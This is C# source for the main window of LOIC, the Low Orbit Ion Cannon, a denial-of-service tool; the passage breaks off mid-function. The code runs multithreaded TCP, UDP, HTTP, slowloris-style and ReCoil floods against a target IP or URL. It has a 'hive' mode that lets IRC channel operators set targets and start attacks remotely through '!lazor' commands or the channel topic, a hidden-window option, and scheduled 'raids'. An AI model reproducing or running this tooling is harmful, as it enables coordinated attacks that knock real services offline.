/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Meebey.SmartIrc4net;



namespace LOIC
{
    public partial class frmMain : Form
    {
        private static XXPFlooder[] xxp;
        private static HTTPFlooder[] http;
        private static List<cHLDos> lLoic = new List<cHLDos>();
        private StringCollection aUpOLSites = new StringCollection();
        private StringCollection aDownOLSites = new StringCollection();
        private bool bIsHidden = false;
        private static string sIP, sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
        private static int iPort, iThreads, iProtocol, iDelay, iTimeout, iSockspThread;
        private static bool bResp, intShowStats;
        private IrcClient irc;
        private Thread irclisten;
        private string channel;
        private static bool ircenabled = false;
        private Dictionary<string, string> OpList;
        private delegate void CheckParamsDelegate(List<string> pars);
        public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
        {
            InitializeComponent();
            /* IRC */
            if (ircserver != "") {txtIRCserver.Text = ircserver;}
            if (ircport != "") {txtIRCport.Text = ircport;}
            if (ircchannel != "") {txtIRCchannel.Text = ircchannel;}
            /* Lets try this! */
            bIsHidden = hide;
            if ( hide )
            {
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
            }
            this.FormClosing += frmMain_Closing;
            if (hive) enableHive.Checked = true;
            if (!hive) disableHive.Checked = true;
        }
        private void Attack(bool toggle, bool on, bool silent)
        {
            if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
            {
                try
                {
                    try { iPort = Convert.ToInt32(txtPort.Text); }
                    catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }

                    try { iThreads = Convert.ToInt32(txtThreads.Text); }
                    catch { throw new Exception("What on earth made you put THAT in the threads field?"); }

                    sIP = txtTarget.Text;
                    if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
                        throw new Exception("Select a target.");

                    iProtocol = 0;
                    sMethod = cbMethod.Text;
                    if (String.Equals(sMethod, "TCP")) iProtocol = 1;
                    if (String.Equals(sMethod, "UDP")) iProtocol = 2;
                    if (String.Equals(sMethod, "HTTP")) iProtocol = 3;
                    if (String.Equals(sMethod, "slowLOIC")) iProtocol = 4;
                    if (String.Equals(sMethod, "ReCoil")) iProtocol = 5;

                    if (iProtocol == 0)
                        throw new Exception("Select a proper attack method.");

                    sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
                    if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
                        throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

                    sSubsite = txtSubsite.Text;
                    if (!sSubsite.StartsWith("/") && (iProtocol >= 3))
                        throw new Exception("You have to enter a subsite (for example \"/\")");

                    try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
                    catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
                    if (iTimeout > 1000)
                    {
                        iTimeout = 30;
                        txtTimeout.Text = "30";
                    }

                    bResp = chkResp.Checked;

                    sTargetDNS = txtTargetURL.Text;
                    sTargetIP = txtTargetIP.Text;

                    if (iProtocol == 4 || iProtocol == 5)
                    {
                        try { iSockspThread = Convert.ToInt32(txtSLSpT.Text); }
                        catch { throw new Exception("A number is fine too!"); }
                    }
                }
                catch (Exception ex) {
                    if (silent) return;
                    new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return; 
                }

                cmdAttack.Text = "Stop flooding";
                //let's lock down the controls, that could actually change the creation of new sockets
                chkUsegZip.Enabled = false;
                chkUseGet.Enabled = false;
                chkMsgRandom.Enabled = false;
                chkRandom.Enabled = false;
                cbMethod.Enabled = false;
                chkResp.Enabled = false;
                txtSLSpT.Enabled = false;

                if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
                {
                    xxp = new XXPFlooder[iThreads];
                    for (int a = 0; a < xxp.Length; a++)
                    {
                        xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData, chkMsgRandom.Checked);
                        xxp[a].Start();
                    }
                }
                if (String.Equals(sMethod, "HTTP"))
                {
                    http = new HTTPFlooder[iThreads];
                    for (int a = 0; a < http.Length; a++)
                    {
                        http[a] = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
                        http[a].start();
                    }
                }
                if ((iProtocol == 4) || (iProtocol == 5))
                {
                    if (lLoic.Count > 0)
                    {
                        for (int a = (lLoic.Count - 1); a >= 0; a--)
                        {
                            lLoic[a].IsFlooding = false;
                        }
                    }
                    lLoic.Clear();
                    cHLDos ts;
                    for (int i = 0; i < iThreads; i++)
                    {
                        if (iProtocol == 5)
                        {
                            ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
                        }
                        else
                        {
                            ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
                        }
                        ts.start();
                        lLoic.Add(ts);
                    }
                }

                tShowStats.Start();
            }
            else if (toggle == true || on == false)
            {
                cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
                chkUsegZip.Enabled = true;
                chkUseGet.Enabled = true;
                chkMsgRandom.Enabled = true;
                chkRandom.Enabled = true;
                cbMethod.Enabled = true;
                chkResp.Enabled = true;
                txtSLSpT.Enabled = true;
                if (xxp != null)
                {
                    for (int a = 0; a < xxp.Length; a++)
                    {
                        xxp[a].IsFlooding = false;
                    }
                }
                if (http != null)
                {
                    for (int a = 0; a < http.Length; a++)
                    {
                        http[a].IsFlooding = false;
                    }
                }
                if (lLoic.Count > 0)
                {
                    for (int a = (lLoic.Count - 1); a >= 0; a--)
                    {
                        lLoic[a].IsFlooding = false;
                    }
                }
                //tShowStats.Stop();
            }
        }
        private void LockOnIP(bool silent)
        {
            if (txtTargetIP.Text.Length == 0)
            {
                if (silent) return;
                new frmWtf().Show();
                MessageBox.Show("I think you forgot the IP.", "What the shit.");
                return;
            }
            txtTarget.Text = txtTargetIP.Text;
        }
        private void LockOnURL(bool silent)
        {
            string url = txtTargetURL.Text.ToLower();
            if (url.Length == 0)
            {
                if (silent) return;
                new frmWtf().Show();
                MessageBox.Show("A URL is fine too...", "What the shit.");
                return;
            }
            if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
            else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
            try 
            { 
                var turi = new Uri(url).Host;
                txtTarget.Text = Dns.GetHostEntry(turi).AddressList[0].ToString();
                txtTargetURL.Text = turi;
            }
            catch (Exception)
            {
                if (silent) return;
                new frmWtf().Show();
                MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
                return;
            }
        }
        private void DoHive(bool enabled)
        {
            try
            {
                // Is everything ok?
                if ((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled)
                {
                    disableHive.Checked = true;
                }
                else if (enabled)
                {
                    try { IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text); }
                    catch (Exception) { disableHive.Checked = true; }
                }
                if (disableHive.Checked && enabled)
                {
                    new frmWtf().Show();
                    MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
                    return;
                }

                // We are starting connection. Disable input in IRC boxes.
                txtIRCserver.Enabled = !enabled;
                txtIRCport.Enabled = !enabled;
                txtIRCchannel.Enabled = !enabled;

                // Lets try this!
                ircenabled = enabled;
                if (enabled)
                {
                    label25.Text = "Connecting..";
                    irc = new IrcClient();
                    irc.OnConnected += IrcConnected;
                    irc.OnReadLine += OnReadLine;
                    irc.OnChannelMessage += OnMessage;
                    irc.OnOp += OnOp;
                    irc.OnDeop += OnDeOp;
                    irc.OnPart += OnPart;
                    irc.OnNickChange += OnNickChange;
                    irc.OnTopic += OnTopic;
                    irc.OnTopicChange += OnTopicChange;
                    irc.OnQuit += OnQuit;
                    irc.OnKick += OnKick;
                    irc.OnDisconnected += IrcDisconnected;
                    irc.OnNames += OnNames;
                    irc.AutoRejoinOnKick = true;
                    irc.AutoRejoin = true;
                    try
                    {
                        int port;
                        if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
                        irc.Connect(txtIRCserver.Text, port);
                        channel = txtIRCchannel.Text.ToLower();
                        // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
                        // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
                        irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");

                        //Spawn a fuckign thread to handle the listen.. why!?!?
                        irclisten = new Thread(new ThreadStart(IrcListenThread));
                        irclisten.Start();
                    }
                    catch
                    { }
                }
                else
                {
                    try
                    {
                        if (irc != null) irc.Disconnect();
                    }
                    catch
                    { }
                    label25.Text = "Disconnected.";
                }
            }
            catch
            { }
        }
        private void IrcListenThread()
        {
            while (ircenabled)
            {
                irc.Listen();
            }
        }
        private void IrcDisconnected(object o, EventArgs e)
        {
            if (ircenabled)
            {
                try
                {
                    int port;
                    if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
                    irc.Connect(txtIRCserver.Text, port);
                    irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
                }
                catch
                { }
            }
        }
        private void IrcConnected(object o, EventArgs e)
        {
            label25.Text = "Logging In...";
        }
        private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);
        void OnNames(object sender, NamesEventArgs e)
        {
            if (label25.Text == "Logging In...") // we don't want to overwrite the Topic thingy on connect!
                SetStatus("Connected!");
            if (OpList != null)
            {
                OpList.Clear();
            }
            else
            {
                if (OpList == null) OpList = new Dictionary<string, string>();
            }

            foreach (string user in e.UserList)
            {
                if (user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
                {
                    
                    OpList.Add(user.Substring(1), "");
                }
            }
        }
        void OnOp(object sender, OpEventArgs e)
        {
            if (OpList == null) OpList = new Dictionary<string, string>();
            if (!OpList.ContainsKey(e.Whom))
            {
                OpList.Add(e.Whom, "");
            }
        }
        void OnDeOp(object sender, DeopEventArgs e)
        {
            if (OpList == null) OpList = new Dictionary<string, string>();
            if (OpList.ContainsKey(e.Whom))
            {
                OpList.Remove(e.Whom);
            }
        }
        void OnPart(object sender, PartEventArgs e)
        {
            if (OpList == null) OpList = new Dictionary<string, string>();
            if (OpList.ContainsKey( e.Who))
            {
                OpList.Remove(e.Who);
            }
        }
        void OnQuit(object sender, QuitEventArgs e)
        {
            if (OpList == null) OpList = new Dictionary<string, string>();
            if (OpList.ContainsKey(e.Who))
            {
                OpList.Remove(e.Who);
            }
        }
        void OnTopic(object sender, TopicEventArgs e)
        {
            if (e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor "))
            {
                List<string> pars = new List<string>(e.Topic.Split(' '));
                SetStatus("Controlled by topic");
                try
                {
                    txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
                }
                catch
                { }
            }
        }
        void OnTopicChange(object sender, TopicChangeEventArgs e)
        {
            if (e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor "))
            {
                List<string> pars = new List<string>(e.NewTopic.Split(' '));
                SetStatus("Controlled by topic");
                try
                {
                    txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
                }
                catch
                { }
            }
        }
        void OnNickChange(object sender, NickChangeEventArgs e)
        {
            if (OpList.ContainsKey(e.OldNickname))
            {
                OpList.Remove(e.OldNickname);

                if (!OpList.ContainsKey(e.NewNickname))
                {
                    OpList.Add(e.NewNickname, "");
                }
            }
        }
        void OnKick(object sender, KickEventArgs e)
        {
            if (OpList == null) OpList = new Dictionary<string, string>();
            if (OpList.ContainsKey(e.Whom))
            {
                OpList.Remove(e.Whom);
            }
        }
        private delegate void SetStatusDelegate(string status);
        void SetStatus(string status)
        {
            if (label25.InvokeRequired)
            {
                label25.Invoke(new SetStatusDelegate(SetStatus), status);
            }
            else
            {
                label25.Text = status;
            }
        }
        void OnMessage(object sender, IrcEventArgs e)
        {
            if (e.Data.Channel.ToLower() == channel)
            {
                if (e.Data.Message.StartsWith("!lazor "))
                {
                    //authenticate
                    if (OpList != null && OpList.ContainsKey(e.Data.Nick))
                    {
                        List<string> pars = new List<string>(e.Data.Message.Split(' '));
                        SetStatus("Controlled by "+e.Data.Nick);
                        try
                        {
                            txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
                        }
                        catch
                        { }
                    }
                    else
                    {
                        //disregard, he sucks cocks
                        //irc.RfcPrivmsg(e.Data.Channel, "I'm gonna disregard that, you suck cocks");
                    }
                }
            }
        }
        void CheckParams(List<string> pars)
        {
            Attack(false, false, true);

            foreach (string param in pars)
            {
                string[] sp = param.Split('=');
                if (sp.Length > 1)
                {
                    string cmd = sp[0];
                    string value = sp[1];
                    int num;
                    bool isnum;
                    switch (cmd.ToLower())
                    {
                        case "targetip":
                            txtTargetIP.Text = value;
                            LockOnIP(true);
                            break;
                        case "targethost":
                            txtTargetURL.Text = value;
                            LockOnURL(true);
                            break;
                        case "timeout":
                            isnum = int.TryParse(value, out num);
                            if (isnum)
                            {
                                txtTimeout.Text = num.ToString();
                            }
                            break;
                        case "subsite":
                            txtSubsite.Text = Uri.UnescapeDataString(value);
                            break;
                        case "message":
                            txtData.Text = Uri.UnescapeDataString(value);
                            break;
                        case "port":
                            txtPort.Text = value;
                            break;
                        case "method":
                            int index = cbMethod.FindString(value);
                            if (index != -1) { cbMethod.SelectedIndex = index; }
                            break;
                        case "threads":
                            isnum = int.TryParse(value, out num);
                            if (isnum && num < 100) //let's protect them a bit, yeah?
                            {
                                txtThreads.Text = num.ToString();
                            }
                            break;
                        case "wait":
                            if (value.ToLower() == "true")
                            {
                                chkResp.Checked = true;
                            }
                            else if (value.ToLower() == "false")
                            {
                                chkResp.Checked = false;
                            }
                            break;
                        case "random":
                            if (value.ToLower() == "true")
                            {
                                chkRandom.Checked = true; //HTTP
                                chkMsgRandom.Checked = true; //TCP_UDP
                            }
                            else if (value.ToLower() == "false")
                            {
                                chkRandom.Checked = false; //HTTP
                                chkMsgRandom.Checked = false; //TCP_UDP
                            }
                            break;
                        case "speed":
                            isnum = int.TryParse(value, out num);
                            if (isnum && num >= tbSpeed.Minimum && num <= tbSpeed.Maximum) //let's protect them a bit, yeah?
                            {
                                tbSpeed.Value = num;
                            }
                            break;
                        case "useget":
                            if (value.ToLower() == "true")
                            {
                                chkUseGet.Checked = true;
                            }
                            else if (value.ToLower() == "false")
                            {
                                chkUseGet.Checked = false;
                            }
                            break;
                        case "usegzip":
                            if (value.ToLower() == "true")
                            {
                                chkUsegZip.Checked = true;
                            }
                            else if (value.ToLower() == "false")
                            {
                                chkUsegZip.Checked = false;
                            }
                            break;
                        case "sockspthread":
                            isnum = int.TryParse(value, out num);
                            if (isnum && num < 100) //let's protect them a bit, yeah?
                            {
                                txtSLSpT.Text = num.ToString();
                            }
                            break;
                    }
                }
                else
                {
                    if (sp[0].ToLower() == "start")
                    {
                        Attack(false, true, true);
                        return;
                    }
                    else if (sp[0].ToLower() == "default")
                    {
                        txtTargetIP.Text = "";
                        txtTargetURL.Text ="";
                        txtTimeout.Text = "30";
                        txtSubsite.Text = "/";
                        txtData.Text = "U dun goofed";
                        txtPort.Text = "80";
                        int index = cbMethod.FindString("TCP");
                        if (index != -1) { cbMethod.SelectedIndex = index; }
                        txtThreads.Text = "10";
                        chkResp.Checked = true;
                        chkRandom.Checked = false;
                        chkMsgRandom.Checked = false;
                        tbSpeed.Value = 0;
                        txtSLSpT.Text = "50";
                        chkUsegZip.Checked = false;
                        chkUseGet.Checked = false;
                    }
                }
            }
            SetStatus("Waiting.");
        }
        void OnReadLine(object sender, ReadLineEventArgs e)
        {
            string command = e.Line.Split(' ')[1];
            if( command.Equals("PING") )
            {
                string server = e.Line.Split(' ')[2];
                irc.WriteLine("PONG " + server, Priority.Critical);
            }
            else if( command.Equals("422") || command.Equals("376") ) // 422: motd missing // 376: end of motd
            {
                if (OpList != null) OpList.Clear();
                irc.RfcJoin(channel);
            }
        }
        private void frmMain_Load(object sender, EventArgs e)
        {
            this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
        }
        private void frmMain_Closing(object sender, FormClosingEventArgs e)
        {
            try
            {
                ircenabled = false;
                if (irclisten != null) irclisten.Abort();
                if (irc != null) irc.Disconnect();
            }
            catch
            { }
            finally
            {
                Environment.Exit(0);
            }
        }
        private void cmdTargetURL_Click(object sender, EventArgs e)
        {
            LockOnURL(false);
        }
        private void cmdTargetIP_Click(object sender, EventArgs e)
        {
            LockOnIP(false);
        }
        private void txtTarget_Enter(object sender, EventArgs e)
        {
            cmdAttack.Focus();
        }
        private void cmdAttack_Click(object sender, EventArgs e)
        {
            Attack(true, false, false);
        }
        private void tShowStats_Tick(object sender, EventArgs e)
        {
            if (intShowStats) return; intShowStats = true;

            bool isFlooding = false;
            if (cmdAttack.Text == "Stop flooding") 
                isFlooding = true;
            if (iProtocol == 1 || iProtocol == 2)
            {
                int iFloodCount = 0;
                int iFailed = 0;
                for (int a = 0; a < xxp.Length; a++)
                {
                    iFloodCount += xxp[a].FloodCount;
                    iFailed += xxp[a].Failed;
                    if (isFlooding && !xxp[a].IsFlooding)
                    {
                        xxp[a].Start();
                    }
                }
                lbRequested.Text = iFloodCount.ToString();
                lbFailed.Text = iFailed.ToString();
                if (!bIsHidden && TrayIcon.Visible)
                {
                    if (isFlooding)
                    {
                        string tst = "Target: " + ((sTargetDNS == "") ? sTargetIP : (sTargetDNS + "(" + sTargetIP + ")"));
                        if (tst.Length > 63)
                            tst = tst.Substring(0, 63);
                        TrayIcon.Text = tst;
                        TrayIcon.BalloonTipTitle = tst;
                        tst = "requested: " + iFloodCount.ToString() + Environment.NewLine
                            + "failed: " + iFailed.ToString();
                        if (tst.Length > 254)
                            tst = tst.Substring(0, 254);
                        TrayIcon.BalloonTipText = tst;
                    }
                    else
                    {
                        TrayIcon.Text = "Waiting for target!";
                        TrayIcon.BalloonTipText = "";
                        TrayIcon.BalloonTipTitle = "";
                    }
                }
            }
            if (iProtocol >= 3)
            {
                int iIdle = 0;
                int iConnecting = 0;
                int iRequesting = 0;
                int iDownloading = 0;
                int iDownloaded = 0;
                int iRequested = 0;
                int iFailed = 0;

                if (iProtocol == 3)
                {
                    for (int a = 0; a < http.Length; a++)
                    {
                        iDownloaded += http[a].Downloaded;
                        iRequested += http[a].Requested;
                        iFailed += http[a].Failed;
                        if (http[a].State == HTTPFlooder.ReqState.Completed)
                            iIdle++;
                        if (http[a].State == HTTPFlooder.ReqState.Connecting)
                            iConnecting++;
                        if (http[a].State == HTTPFlooder.ReqState.Requesting)
                            iRequesting++;
                        if (http[a].State == HTTPFlooder.ReqState.Downloading)
                            iDownloading++;
                        if (isFlooding && !http[a].IsFlooding)
                        {
                            int iaDownloaded = http[a].Downloaded;
                            int iaRequested = http[a].Requested;
                            int iaFailed = http[a].Failed;
                            http[a] = null;
                            http[a] = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
                            http[a].Downloaded = iaDownloaded;
                            http[a].Requested = iaRequested;
                            http[a].Failed = iaFailed;
                            http[a].start();
                        }
                    }
                }
                else if ((iProtocol == 5) || (iProtocol == 4))
                {
                    for (int a = (lLoic.Count - 1); a >= 0; a--)
                    {
                        iDownloaded += lLoic[a].Downloaded;
                        iRequested += lLoic[a].Requested;
                        iFailed += lLoic[a].Failed;
                        if (lLoic[a].State == cHLDos.ReqState.Completed)
                            iIdle++;
                        if (lLoic[a].State == cHLDos.ReqState.Connecting)
                            iConnecting++;
                        if (lLoic[a].State == cHLDos.ReqState.Requesting)
                            iRequesting++;
                        if (lLoic[a].State == cHLDos.ReqState.Downloading)
                            iDownloading++;
                        if (isFlooding && !lLoic[a].IsFlooding)
                        {
                            int iaDownloaded = lLoic[a].Downloaded;
                            int iaFailed = lLoic[a].Failed;
                            lLoic.RemoveAt(a);
                            cHLDos ts;
                            if (iProtocol == 5)
                            {
                                ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
                            }
                            else
                            {
                                ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
                            }
                            ts.Downloaded = iaDownloaded;
                            ts.Failed = iaFailed;
                            ts.start();
                            lLoic.Add(ts);
                        }
                    }
                    if (isFlooding)
                    {
                        while (lLoic.Count < iThreads)
                        {
                            cHLDos ts;
                            if (iProtocol == 5)
                            {
                                ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
                            }
                            else
                            {
                                ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
                            }
                            ts.start();
                            lLoic.Add(ts);
                        }
                        if (lLoic.Count > iThreads)
                        {
                            for (int a = (lLoic.Count - 1); a >= iThreads; a--)
                            {
                                lLoic[a].stop();
                                lLoic.RemoveAt(a);
                            }
                        }
                    }
                }
                lbFailed.Text = iFailed.ToString();
                lbRequested.Text = iRequested.ToString();
                lbDownloaded.Text = iDownloaded.ToString();
                lbDownloading.Text = iDownloading.ToString();
                lbRequesting.Text = iRequesting.ToString();
                lbConnecting.Text = iConnecting.ToString();
                lbIdle.Text = iIdle.ToString();
                if (!bIsHidden && TrayIcon.Visible)
                {
                    if (isFlooding)
                    {
                        string tst = "Target: " + ((sTargetDNS == "") ? sTargetIP : (sTargetDNS + "(" + sTargetIP + ")"));
                        if(tst.Length > 63)
                            tst = tst.Substring(0,63);
                        TrayIcon.Text = tst;
                        TrayIcon.BalloonTipTitle = tst;
                        tst = "Idle: " + iIdle.ToString() + Environment.NewLine
                            + "Connecting: " + iConnecting.ToString() + Environment.NewLine
                            + "Requesting: " + iRequesting.ToString() + Environment.NewLine
                            + "Downloading: " + iDownloading.ToString() + Environment.NewLine + Environment.NewLine
                            + "downloaded: " + iDownloaded.ToString() + Environment.NewLine
                            + "requested: " + iRequested.ToString() + Environment.NewLine
                            + "failed: " + iFailed.ToString();
                        if(tst.Length > 254)
                            tst = tst.Substring(0,254);
                        TrayIcon.BalloonTipText = tst;
                    }
                    else
                    {
                        TrayIcon.Text = "Waiting for target!";
                        TrayIcon.BalloonTipText = "";
                        TrayIcon.BalloonTipTitle = "";
                    }
                }
            }

            intShowStats = false;
        }
        private void tbSpeed_ValueChanged(object sender, EventArgs e)
        {
            iDelay = tbSpeed.Value;
            if (http != null)
            {
                for (int a = 0; a < http.Length; a++)
                {
                    if (http[a] != null) http[a].Delay = iDelay;
                }
            }
            if (xxp != null)
            {
                for (int a = 0; a < xxp.Length; a++)
                {
                    if (xxp[a] != null) xxp[a].Delay = iDelay;
                }
            }
            if (lLoic.Count > 0)
            {
                for (int a = (lLoic.Count - 1); a >= 0; a--)
                {
                    lLoic[a].Delay = iDelay;
                }
            }
        }
        private void enableHive_CheckedChanged(object sender, EventArgs e)
        {
            if (enableHive.Checked)
            {
                DoHive(true);
                DoOverLord(false);
            }
        }
        private void disableHive_CheckedChanged(object sender, EventArgs e)
        {
            if (disableHive.Checked)
            {
                DoHive(false);
                DoOverLord(false);
            }
        }
        private void label24_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://github.com/NewEraCracker/LOIC");
        }

        /// <summary>
        /// Decodes the commands and if necessary (re)starts the Attack.
        /// Works with the Captures from RegEx.
        /// </summary>
        /// <param name="cmds">the CaptureCollection containing a collection of commands</param>
        /// <param name="vals">the CaptureCollection containing a collection of values corresponding to the commands.</param>
        /// <returns>True if the commands were successfully loaded. False in case of any error.</returns>
        private bool parseOLUrlCmd(CaptureCollection cmds, CaptureCollection vals)
        {
            bool ret = false;
            if ((cmds.Count == vals.Count) && (cmds.Count > 0))
            {
                StringCollection defaults = new StringCollection();
                defaults.Add("targetip"); defaults.Add("targethost"); defaults.Add("timeout");
                defaults.Add("subsite"); defaults.Add("message"); defaults.Add("port");
                defaults.Add("method"); defaults.Add("threads"); defaults.Add("wait");
                defaults.Add("random"); defaults.Add("speed"); defaults.Add("sockspthread");
                defaults.Add("useget"); defaults.Add("usegzip");
                
                int num = 0;
                bool isnum = false;
                bool restart = false;
                bool ctdwndn = false;
                string tval = "";
                string tcmd = "";

                for (int i = 0; i < cmds.Count; i++)
                {
                    tval = vals[i].Value.Trim();
                    tcmd = cmds[i].Value.Trim();
                    defaults.Remove(tcmd);
                    switch (tcmd.ToLower())
                    {
                        case "targetip":
                            if (txtTargetIP.Text != tval)
                            {
                                txtTargetIP.Text = tval;
                                LockOnIP(true);
                                restart = true;
                            }
                            ret = true;
                            break;
                        case "targethost":
                            if (txtTargetURL.Text != tval)
                            {
                                txtTargetURL.Text = tval;
                                LockOnURL(true);
                                restart = true;
                            }
                            ret = true;
                            break;
                        case "timeout":
                            isnum = int.TryParse(tval, out num);
                            if (isnum)
                            {
                                if (txtTimeout.Text != num.ToString())
                                {
                                    txtTimeout.Text = num.ToString();
                                    restart = true;
                                }
                            }
                            break;
                        case "subsite":
                            tval = Uri.UnescapeDataString(tval);
                            if (txtSubsite.Text != tval)
                            {
                                txtSubsite.Text = tval;
                                restart = true;
                            }
                            break;
                        case "message":
                            if (txtData.Text != tval)
                            {
                                txtData.Text = tval;
                                restart = true;
                            }
                            break;
                        case "port":
                            if (txtPort.Text != tval)
                            {
                                txtPort.Text = tval;
                                restart = true;
                            }
                            break;
                        case "method":
                            int index = cbMethod.FindString(tval);
                            if (index != -1)
                            {
                                if (cbMethod.SelectedIndex != index)
                                {
                                    cbMethod.SelectedIndex = index;
                                    restart = true;
                                }
                            }
                            break;
                        case "threads":
                            isnum = int.TryParse(tval, out num);
                            if (isnum) //let's protect them a bit, yeah? - no we don't!!
                            {
                                if (txtThreads.Text != num.ToString())
                                {
                                    txtThreads.Text = num.ToString();
                                    if(cbMethod.SelectedIndex >= 3)
                                        restart = true;
                                }
                            }
                            break;
                        case "wait":
                            if (tval.ToLower() == "true")
                            {
                                if (!chkResp.Checked)
                                    restart = true;
                                chkResp.Checked = true;
                            }
                            else if (tval.ToLower() == "false")
                            {
                                if (chkResp.Checked)
                                    restart = true;
                                chkResp.Checked = false;
                            }
                            break;
                        case "random":
                            if (tval.ToLower() == "true")
                            {
                                if (!chkRandom.Checked || !chkMsgRandom.Checked)
                                    restart = true;
                                chkRandom.Checked = true; //HTTP
                                chkMsgRandom.Checked = true; //TCP_UDP
                            }
                            else if (tval.ToLower() == "false")
                            {
                                if (chkRandom.Checked || chkMsgRandom.Checked)
                                    restart = true;
                                chkRandom.Checked = false; //HTTP
                                chkMsgRandom.Checked = false; //TCP_UDP
                            }
                            break;
                        case "speed":
                            isnum = int.TryParse(tval, out num);
                            if (isnum && num >= tbSpeed.Minimum && num <= tbSpeed.Maximum) //let's protect them a bit, yeah?
                            {
                                if (tbSpeed.Value != num)
                                {
                                    tbSpeed.Value = num;
                                    restart = true;
                                }
                            }
                            break;
                        case "hivemind":
                            string[] sp = tval.Split(':');
                            if (sp.Length > 1)
                            {
                                txtIRCserver.Text = sp[0];
                                string[] spt = sp[1].Split('#');
                                if (spt.Length > 1)
                                {
                                    txtIRCport.Text = spt[0];
                                    txtIRCchannel.Text = '#' + spt[1];
                                    enableHive.Checked = true;
                                    return true;
                                }
                            }
                            //ret = true;
                            break;
                        case "time": // might be not a bad idea to include a NTP-lookup before this?
                            System.Globalization.CultureInfo ci = System.Globalization.CultureInfo.CurrentCulture;
                            DateTime dtGo = DateTime.Parse(tval, ci.DateTimeFormat, System.Globalization.DateTimeStyles.AssumeUniversal);
                            DateTime dtNow = DateTime.Now;
                            long tdiff = dtGo.Ticks - dtNow.Ticks;
                            tdiff /= TimeSpan.TicksPerMillisecond;
                            ret = true;
                            tZergRush.Stop();
                            if (tdiff > 0)
                            {
                                tZergRush.Interval = (int)tdiff;
                                tZergRush.Start();
                                this.Text = String.Format("{0} | U dun goofed | v. {1} | Next Raid: {2}", Application.ProductName, Application.ProductVersion, dtGo.ToString("MM-dd HH:mm"));
                                restart = true;
                            }
                            else
                            {
                                ctdwndn = true;
                                this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
                            }
                            ret = true;
                            break;
                        case "useget":
                            if (tval.ToLower() == "true")
                            {
                                chkUseGet.Checked = true;
                            }
                            else if (tval.ToLower() == "false")
                            {
                                chkUseGet.Checked = false;
                            }
                            break;
                        case "usegzip":
                            if (tval.ToLower() == "true")
                            {
                                chkUsegZip.Checked = true;
                            }
                            else if (tval.ToLower() == "false")
                            {
                                chkUsegZip.Checked = false;
                            }
                            break;
                        case "sockspthread":
                            isnum = int.TryParse(tval, out num);
                            if (isnum && num < 100) //let's protect them a bit, yeah?
                            {
                                txtSLSpT.Text = num.ToString();
                            }
                            break;
                    }
                }
                // let's reset the other values -.-
                for (int i = 0; i < defaults.Count; i++)
                {
                    switch (defaults[i])
                    {
                        case "targetip":
                            txtTargetIP.Text = "";
                            break;
                        case "targethost":
                            txtTargetURL.Text = "";
                            break;
                        case "timeout":
                            txtTimeout.Text = "30";
                            break;
                        case "subsite":
                            txtSubsite.Text = "/";
